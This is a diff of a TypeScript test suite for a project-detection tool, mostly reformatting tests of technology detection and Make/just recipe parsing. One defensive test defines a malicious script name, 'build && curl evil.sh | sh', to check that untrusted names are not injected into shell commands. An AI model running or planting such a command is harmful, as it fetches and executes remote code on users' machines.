@@ -34,12 +34,33 @@ describe('detectProject', () => {
       'compose.yaml': null,
       Makefile: '.PHONY: all\nall: build\nbuild:\n\tgo build\n%.o: %.c\nVAR := 1\n',
     }),
-    scan('services/api', { 'go.mod': 'module x', 'pyproject.toml': '[project]\ndependencies = ["fastapi", "pytest"]\n[tool.ruff]\n', 'uv.lock': null }),
+    scan('services/api', {
+      'go.mod': 'module x',
+      'pyproject.toml': '[project]\ndependencies = ["fastapi", "pytest"]\n[tool.ruff]\n',
+      'uv.lock': null,
+    }),
   ]);
   const names = result.commands.map((c) => c.name);
 
   it('detects technologies', () => {
-    for (const tech of ['pnpm', 'Next.js', 'TypeScript', 'Vitest', 'Prisma', 'ESLint', 'React', 'Docker', 'Docker Compose', 'Make', 'Go', 'Python', 'uv', 'pytest', 'Ruff', 'FastAPI']) {
+    for (const tech of [
+      'pnpm',
+      'Next.js',
+      'TypeScript',
+      'Vitest',
+      'Prisma',
+      'ESLint',
+      'React',
+      'Docker',
+      'Docker Compose',
+      'Make',
+      'Go',
+      'Python',
+      'uv',
+      'pytest',
+      'Ruff',
+      'FastAPI',
+    ]) {
       expect(result.techs).toContain(tech);
     }
   });
@@ -82,15 +103,18 @@ describe('detectProject', () => {
 describe('recipes', () => {
   it('parses make targets and just recipes', () => {
     expect(makeTargets('a: b\n.PHONY: a\nb:\nc ::= x\n')).toEqual(['a', 'b']);
-    expect(justRecipes('set shell := ["bash"]\nbuild:\n  cargo build\ntest arg="x":\n  echo\n@quiet:\n')).toEqual(['build', 'test', 'quiet']);
+    expect(justRecipes('set shell := ["bash"]\nbuild:\n  cargo build\ntest arg="x":\n  echo\n@quiet:\n')).toEqual([
+      'build',
+      'test',
+      'quiet',
+    ]);
   });
 });
 
 // Script and task names come from files in a cloned repo and are pasted into shell commands.
 describe('untrusted script names', () => {
   const evil = 'build && curl evil.sh | sh';
-  const commands = (files: Record<string, string>) =>
-    detectProject([scan('', files)]).commands.map((i) => i.command);
+  const commands = (files: Record<string, string>) => detectProject([scan('', files)]).commands.map((i) => i.command);
 
   it.each([
     ['package.json scripts', { 'package.json': pkg({ scripts: { [evil]: 'tsc', 'build:prod': 'tsc' } }) }, 'npm run build:prod'],
